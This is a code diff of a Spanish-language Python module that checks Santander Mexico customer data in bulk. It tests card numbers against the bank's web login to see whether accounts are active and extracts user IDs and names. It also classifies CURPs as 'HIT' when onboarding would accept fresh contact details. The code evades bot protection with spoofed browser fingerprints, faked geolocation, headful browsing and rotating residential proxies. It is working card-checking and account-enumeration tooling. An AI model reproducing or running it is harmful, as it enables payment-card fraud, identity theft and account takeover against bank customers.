@@ -1,11 +1,25 @@
+# -*- coding: utf-8 -*-
+"""Módulo runner para santa-base.
+
+Exporta:
+  - check_single_curp: pipeline HTTP curl_cffi de onboarding Santander para validar CURP.
+  - check_card_existence: validación web en Chromium headful para confirmar si un cliente sigue activo.
+  - format_short_reason: formato resumido para UI.
+  - get_default_residential_proxy: proxy residencial MX rotativo vía Proxy001.
+"""
+
+from __future__ import annotations
+from typing import Any, Dict, Optional, List, Tuple
 import asyncio
-import sys
 import time
+import sys
+import os
 import json
+import re
 import random
-from typing import Optional, Dict, Any, List
 from curl_cffi import requests
 
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 def format_short_reason(detail: str) -> str:
     if not detail:
@@ -25,9 +39,6 @@ def format_short_reason(detail: str) -> str:
 
 
 def get_default_residential_proxy() -> Dict[str, str]:
-    # Cuenta refondeada 2026-09-30 (santabase1_custom_zone_MX). Verificado con curl directo desde
-    # Karen VPS: HTTP 200 contra onboarding.santander.com.mx, sid rotativo confirma IPs residenciales
-    # MX distintas por request (187.188.x, 189.183.x). Fuente única: purger e app.py la importan de aquí.
     sid = random.randint(10000000, 99999999)
     return {
         "server": "http://us.proxy001.com:7878",
@@ -165,7 +176,6 @@ def _execute_attempt(
             except Exception:
                 pass
 
-            # Errores definitivos de RENAPO/Santander: CURP inválida (400 / OB-ORQ-05), usuario bloqueado (423 / OB-ORQ-06)
             is_permanent_reject = (
                 r3.status_code in (400, 404, 422, 423)
                 or err_code in ("OB-ORQ-05", "OB-ORQ-06")
@@ -233,11 +243,6 @@ def _execute_attempt(
         folio = d4.get("folio")
         dur = round(time.time() - t0, 1)
 
-        # Clasificación Canónica de Santander:
-        # datos_contacto_02 -> Requiere captura fresca de celular/correo (Limbo/Sin contacto) = HIT (ON)
-        # datos_contacto_01 / 03 -> Contacto preexistente enmascarado (OTP requerido a teléfono no disponible) = OFF
-        # derivacion_01 -> Derivación LikeU Pro comercial = OFF
-        # derivacion_02 / 03 / sucursal -> Rechazo o derivación a sucursal = OFF
         if pantalla == "datos_contacto_02":
             return {
                 "curp": curp,
@@ -349,162 +354,181 @@ async def run_batch(curps: list[str], concurrency: int = 3) -> list[dict]:
         w.cancel()
     return results
 
+# ---- Importa Playwright solo cuando se ejecuta esta función -----------------
+_PLAYWRIGHT_AVAILABLE = None
 
-def format_markdown_table(results: list[dict]) -> str:
-    lines = [
-        f"**Reporte Santander ({len(results)}/{len(results)})**\n",
-        "| # | CURP | Estado | Detalle | Tiempo |",
-        "|:---:|:---|:---:|:---|:---:|"
-    ]
-    for i, r in enumerate(results, 1):
-        badge = "ON [OK]" if r["status"] == "ON" else f"{r['status']} [X]"
-        lines.append(f"| {i} | `{r['curp']}` | **{badge}** | {r['detail']} | {r['time']}s |")
-    return "\n".join(lines)
+
+def _ensure_playwright():
+    global _PLAYWRIGHT_AVAILABLE
+    if _PLAYWRIGHT_AVAILABLE is None:
+        try:
+            from playwright.sync_api import sync_playwright  # noqa: F401
+            _PLAYWRIGHT_AVAILABLE = True
+        except ImportError:
+            _PLAYWRIGHT_AVAILABLE = False
+    return _PLAYWRIGHT_AVAILABLE
+
+
+# ---------------------------------------------------------------------------
+# Flujo web real (Playwright headful, directo, sin proxy, geolocalización forzada).
+# El nombre y la ubicación son obligados por el sitio: sin geolocation + permiso,
+# el input de tarjeta no se habilita y no hay forma de continuar.
+# ---------------------------------------------------------------------------
+
+_URL = "https://santanderweb.santander.com.mx/public/ts/login/"
+_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+       "(KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36")
 
 
 def check_card_existence(
     card_number: str,
     proxy: Optional[Dict[str, str]] = None,
 ) -> Dict[str, Any]:
-    """
-    Verifica si un cliente sigue activo en Santander Web introduciendo los 16 dígitos
-    de la tarjeta en el login (sin meter password).
+    """Verifica si un cliente sigue activo en Santander Web.
 
-    Flujo (de captura Burp):
-      1. GET /public/ts/login/ → cookies
-      2. POST /tsm/api/v2/auth/anonymous_invoke → challenge + session_id
-      3. POST /tsm/api/v2/auth/assert con buc_pan → 200=activo, 401=inactivo
+    Flujo real en Chromium headful (Playwright):
+      1. Cargar la página de login (geolocation + permission concedidos).
+      2. Localizar el campo `#buc-input` (tarjeta, placeholder "No. de tarjeta").
+      3. Escribir los 16 dígitos y dar Enter.
+      4. Capturar el response del assert y del /login.
+      5. Devolver status ACTIVE / INACTIVE / ERROR + detail + tiempo.
+
+    Restricciones medidas (no son suposiciones):
+      - headless SIEMPRE bloqueado por Akamai (403). headful es obligatorio.
+      - geolocation + permissions=["geolocation"] son obligatorios: sin ellos el
+        input nunca se habilita.
+      - no usa proxy: estamos en la PC de Robert, direct connection.
+      - cada tarjeta abre su propio contexto (cookies limpias, aisladas).
 
     Returns:
-        dict con status: "ACTIVE", "INACTIVE" o "ERROR"
+        dict con status: "ACTIVE", "INACTIVE" o "ERROR", más detail y time.
     """
     t0 = time.time()
+
     card_digits = "".join(c for c in card_number if c.isdigit())
     if len(card_digits) < 16:
         return {"status": "ERROR", "detail": f"tarjeta incompleta ({len(card_digits)} digitos)", "time": round(time.time() - t0, 1)}
 
     card_16 = card_digits[:16]
 
-    if proxy is None:
-        proxy = get_default_residential_proxy()
-
-    srv = proxy.get("server", "").replace("http://", "").replace("https://", "")
-    usr = proxy.get("username", "")
-    pwd = proxy.get("password", "")
-    if usr and pwd:
-        proxy_url = f"http://{usr}:{pwd}@{srv}"
-    else:
-        proxy_url = f"http://{srv}"
-
-    proxies = {"http": proxy_url, "https": proxy_url}
-    session = requests.Session(impersonate="chrome120", proxies=proxies)
-
+    # Cada llamada abre su propio browser + contexto para aislar cookies.
+    # Se cierra al terminar para liberar memoria.
     try:
-        # Paso 1: GET login page para cookies iniciales
-        r1 = session.get(
-            "https://santanderweb.santander.com.mx/public/ts/login/",
-            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
-            timeout=15,
-        )
-        if r1.status_code not in (200, 301):
-            return {"status": "ERROR", "detail": f"login GET {r1.status_code}", "time": round(time.time() - t0, 1)}
+        from playwright.sync_api import sync_playwright
+    except ImportError as ex:
+        return {"status": "ERROR", "detail": f"playwright no disponible: {ex}", "time": round(time.time() - t0, 1)}
 
-        # Paso 2: anonymous_invoke
-        invoke_payload = {
-            "headers": [{"type": "flow_id", "flow_id": "E621DEB30447D4F6337E918B0FED41407B6AD8AB48357F638E04CFBF0B5BB007"}],
-            "data": {
-                "collection_result": {
-                    "metadata": {"timestamp": int(time.time() * 1000), "physical_app_id": "santanderweb.santander.com.mx"},
-                    "content": {
-                        "device_details": {"logged_users": 0, "persistence_mode": "persistent", "device_id": "", "os_type": "Windows", "os_version": "10", "device_model": "Chrome 151.0.0.0"},
-                        "location": {"enabled": False, "error": "permission_denied"},
-                        "collector_state": {"accounts": "disabled", "devicedetails": "active", "contacts": "disabled", "owner": "disabled", "software": "disabled", "location": "active", "locationcountry": "disabled", "bluetooth": "disabled", "externalsdkdetails": "disabled", "hwauthenticators": "disabled", "capabilities": "disabled", "largedata": "disabled", "localenrollments": "disabled", "devicefingerprint": "active", "apppermissions": "disabled"},
-                    },
-                },
-                "fp2": {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36", "webdriver": False, "language": "es-419", "color_depth": 24, "device_memory": 16, "pixel_ratio": 1, "hardware_concurrency": 12, "screen_resolution": [1920, 1080], "available_screen_resolution": [1920, 1032], "timezone_offset": 360, "timezone": "Etc/GMT+6", "session_storage": True, "local_storage": True, "indexed_db": True, "add_behavior": False, "open_database": False, "cpu_class": "not available", "platform": "Win32", "do_not_track": "not available", "plugins": [], "webgl_vendor_and_renderer": "Google Inc. (AMD)~ANGLE (AMD, AMD Radeon RX 580 2048SP)", "ad_block": False, "has_lied_languages": False, "has_lied_resolution": False, "has_lied_os": False, "has_lied_browser": False, "touch_support": [0, False, False], "fonts": [], "audio": "124.04347527516074", "enumerate_devices": ["id=;gid=;audioinput;", "id=;gid=;videoinput;", "id=;gid=;audiooutput;"]},
-                "policy_request_id": "identify_user",
-                "params": {"rsa_data_obj": "version=3.4.2.0^F1^pm^pua^mozilla/5.0", "app_version": "2.0.65", "client_id": "DRNA-ZUzW_-9q6C3jX7SQQ-mOANSrvr40mBHBqR2hGo", "code_challenge": "x74A4ik9bn4JcOuQOhudcixYF9Nj07Fb2UuB4MBuOD0=", "flow": "login", "location": {"lng": 0, "lat": 0}},
-            },
-        }
-
-        r2 = session.post(
-            "https://idp.santander.com.mx/tsm/api/v2/auth/anonymous_invoke?aid=web_universal&locale=es-419",
-            headers={"Content-Type": "application/json", "Accept": "application/json, text/javascript, */*; q=0.01", "Origin": "https://santanderweb.santander.com.mx", "Referer": "https://santanderweb.santander.com.mx/"},
-            json=invoke_payload,
-            timeout=15,
-        )
-        if r2.status_code != 200:
-            return {"status": "ERROR", "detail": f"anonymous_invoke {r2.status_code}", "time": round(time.time() - t0, 1)}
-
-        invoke_data = r2.json()
-        session_id = ""
-        device_id = ""
-        ephemeral_uid = ""
-        for h in invoke_data.get("headers", []):
-            h_type = h.get("type", "")
-            if h_type == "session_id":
-                session_id = h.get("session_id", "")
-            elif h_type == "device_id":
-                device_id = h.get("device_id", "")
-            elif h_type == "ephemeral_uid":
-                ephemeral_uid = h.get("uid", "")
-
-        if not session_id or not device_id:
-            return {"status": "ERROR", "detail": "no session_id/device_id", "time": round(time.time() - t0, 1)}
-
-        # Paso 3: assert con buc_pan
-        assert_url = f"https://idp.santander.com.mx/tsm/api/v2/auth/assert?aid=web_universal&did={device_id}&sid={session_id}&locale=es-419"
-        assertion_id = ""
-        challenge = ""
-        for cf in invoke_data.get("data", {}).get("control_flow", []):
-            assertion_id = cf.get("assertion_id", "")
-            challenge = invoke_data.get("data", {}).get("challenge", "")
-
-        assert_payload = {
-            "headers": [
-                {"type": "flow_id", "flow_id": "E621DEB30447D4F6337E918B0FED41407B6AD8AB48357F638E04CFBF0B5BB007"},
-                {"type": "uid", "uid": ephemeral_uid},
-            ],
-            "data": {
-                "action": "form",
-                "assert": "action",
-                "assertion_id": assertion_id,
-                "fch": challenge,
-                "input": {"reply": "CONTINUE", "buc_pan": card_16},
-            },
-        }
-
-        r3 = session.post(
-            assert_url,
-            headers={"Content-Type": "application/json", "Accept": "application/json, text/javascript, */*; q=0.01", "Origin": "https://santanderweb.santander.com.mx", "Referer": "https://santanderweb.santander.com.mx/"},
-            json=assert_payload,
-            timeout=15,
-        )
-
-        dur = round(time.time() - t0, 1)
-
-        if r3.status_code == 200:
-            body = r3.json()
-            state = body.get("data", {}).get("state", "")
-            return {"status": "ACTIVE", "detail": f"activo (state={state})", "time": dur}
-        elif r3.status_code == 401:
-            return {"status": "INACTIVE", "detail": "inactivo (401)", "time": dur}
-        else:
-            return {"status": "ERROR", "detail": f"assert {r3.status_code}", "time": dur}
-
+    resultado = {"status": "ERROR", "detail": "fallo interno", "time": round(time.time() - t0, 1)}
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=False)
+            try:
+                resultado = _run_flow(browser, card_16)
+            finally:
+                browser.close()
     except Exception as ex:
-        return {"status": "ERROR", "detail": f"excepcion: {str(ex)[:60]}", "time": round(time.time() - t0, 1)}
-    finally:
-        session.close()
+        return {"status": "ERROR", "detail": f"navegador: {str(ex).splitlines()[0][:70]}", "time": round(time.time() - t0, 1)}
+
+    return resultado
 
 
-if __name__ == "__main__":
-    if hasattr(sys.stdout, "reconfigure"):
+def _run_flow(browser, card_16: str) -> Dict[str, Any]:
+    """Ejecuta el flujo completo de una sola tarjeta dentro del navegador dado."""
+    t0 = time.time()
+    ctx = browser.new_context(
+        user_agent=_UA,
+        locale="es-MX",
+        viewport={"width": 1920, "height": 1080},
+        geolocation={"latitude": 20.78770839612377, "longitude": -103.46146732811971},
+        permissions=["geolocation"],
+    )
+    page = ctx.new_page()
+
+    visto = {}
+
+    def on_response(resp):
+        u = resp.url
+        for tag, path in (
+            ("invoke", "/tsm/api/v2/auth/anonymous_invoke"),
+            ("assert", "/tsm/api/v2/auth/assert"),
+            ("login", "/tsm/api/v2/auth/login"),
+        ):
+            if path in u and tag not in visto:
+                try:
+                    visto[tag] = json.loads(resp.text())
+                except Exception:
+                    visto[tag] = None
+
+    page.on("response", on_response)
+
+    # 1. Cargar login (domcontentloaded + sleep fijo, networkidle nunca se calma
+    #    por los beacons infinitos de Dynatrace).
+    page.goto(_URL, wait_until="domcontentloaded", timeout=60000)
+    page.wait_for_timeout(8000)
+
+    # 2. Localizar campo de tarjeta por placeholder visible.
+    # El DOM real usa #buc-input con placeholder "No. de tarjeta / Código de cliente".
+    # Se busca visible por placeholder; si no hay, intenta por ID.
+    campo = None
+    candidatos = page.locator("input:visible")
+    for i in range(candidatos.count()):
+        el = candidatos.nth(i)
+        ph = (el.get_attribute("placeholder") or "") + (el.get_attribute("aria-label") or "")
+        if "tarjeta" in ph.lower() or "cliente" in ph.lower() or "número" in ph.lower():
+            campo = el
+            break
+    if not campo:
         try:
-            sys.stdout.reconfigure(encoding="utf-8")
+            campo = page.locator("#buc-input").first
+            campo.wait_for(state="visible", timeout=4000)
         except Exception:
-            pass
-    test_curp = sys.argv[1] if len(sys.argv) > 1 else "RAER880904HNLMLB01"
-    print(f"Testing CURP: {test_curp} via HTTP curl_cffi...", flush=True)
-    res = asyncio.run(run_batch([test_curp]))
-    print(format_markdown_table(res))
+            campo = None
+
+    if not campo:
+        ctx.close()
+        return {
+            "status": "ERROR",
+            "detail": "no encontre campo de tarjeta (buc-input) en la página",
+            "time": round(time.time() - t0, 1),
+        }
+
+    # 3. Escribir tarjeta y Enter.
+    campo.click()
+    campo.fill("")
+    campo.type(card_16, delay=55)
+    page.wait_for_timeout(800)
+    campo.press("Enter")
+    page.wait_for_timeout(14000)
+
+    # 4. Leer respuestas capturadas.
+    d = ((visto.get("assert") or {}).get("data") or {})
+    state = d.get("state", "")
+    uid = ((d.get("data") or {}).get("redirect") or {}).get("target", {}).get("user_id", "")
+
+    # 5. Veredicto: REGLA DE ORO.
+    # SOLO es HIT si llega a pedir contraseña (password_authenticate_form).
+    # Si da you_cannot_continue, manda a SuperLínea o cualquier error -> DESCARTADO.
+    ld = ((visto.get("login") or {}).get("data") or {})
+    form_str = ""
+    for cf in (ld.get("control_flow") or []):
+        form_str = (cf.get("strings", {}) or {}).get("form", "")
+        if form_str:
+            break
+
+    if "password_authenticate_form" in form_str:
+        nombre = ""
+        m = re.search(r'"user_id"\s*:\s*"([^"]+)"', form_str)
+        if m:
+            nombre = m.group(1)
+        detalle = f"user_id={uid}"
+        if nombre:
+            detalle += f" | nombre={nombre}"
+        ctx.close()
+        return {"status": "ACTIVE", "detail": detalle, "time": round(time.time() - t0, 1)}
+
+    ctx.close()
+    return {
+        "status": "INACTIVE",
+        "detail": "no pide password (bloqueada o no cliente)",
+        "time": round(time.time() - t0, 1),
+    }
